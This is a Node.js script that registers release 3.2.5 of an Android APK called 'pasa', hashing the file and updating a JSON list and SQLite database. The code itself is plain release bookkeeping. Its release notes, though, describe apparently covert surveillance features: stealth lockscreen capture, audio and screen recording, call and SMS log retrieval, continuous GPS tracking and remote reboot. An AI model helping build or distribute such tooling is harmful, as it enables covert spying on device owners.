const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { initDatabase, ReleaseRepo } = require('./lib/db');

const dbPath = path.join(__dirname, 'data', 'pasa.db');
initDatabase(dbPath);

const apkPath = path.join(__dirname, 'releases', 'pasa-v3.2.5-30.apk');
let sha256 = '';
let size = 0;

if (fs.existsSync(apkPath)) {
  const buf = fs.readFileSync(apkPath);
  size = buf.length;
  sha256 = crypto.createHash('sha256').update(buf).digest('hex');
  console.log(`Calculated sha256: ${sha256}, size: ${size}`);
} else {
  console.warn(`APK not found at ${apkPath}`);
}

const p = path.join(__dirname, 'data', 'app_releases.json');
const list = JSON.parse(fs.readFileSync(p, 'utf8').replace(/^\uFEFF/, ''));

// Remove any existing v30 entry to be clean
const filteredList = list.filter(r => r.versionCode !== 30);

const newRel = {
  versionCode: 30,
  versionName: "3.2.5",
  releaseDate: new Date().toISOString().split('T')[0],
  fileName: "pasa-v3.2.5-30.apk",
  downloadUrl: "https://pasa.izhaanintellect.fun/releases/pasa-v3.2.5-30.apk",
  sha256: sha256,
  size: size,
  mandatory: false,
  releaseNotes: "v3.2.5: Remote Reboot & Surveillance Stability Suite: Added remote hardware reboot (/reboot) via Enterprise Device Owner; Extended execution timeouts for video, screen recording, and audio up to 120-360s; Enhanced Android 14-16 lockscreen stealth capture wake flags; Search filters for /call_log and /sms_log; Continuous GPS tracking immediate fix."
};

filteredList.unshift(newRel);
fs.writeFileSync(p, JSON.stringify(filteredList, null, 2));
console.log("Updated app_releases.json with build 30");

for (const r of filteredList) {
  const mapped = {
    versionCode: r.versionCode,
    versionName: r.versionName,
    filename: r.fileName || r.filename || ('pasa-v' + r.versionName + '.apk'),
    downloadUrl: r.downloadUrl || ('https://pasa.izhaanintellect.fun/releases/' + (r.fileName || r.filename || 'pasa-v' + r.versionName + '.apk')),
    fileSize: r.fileSize || r.size || 0,
    sha256: r.sha256 || '',
    changelog: r.changelog || r.releaseNotes || '',
    publishedAt: r.publishedAt || r.releaseDate || new Date().toISOString()
  };
  ReleaseRepo.add(mapped);
}

console.log("Latest release in SQLite:", JSON.stringify(ReleaseRepo.getLatest(), null, 2));
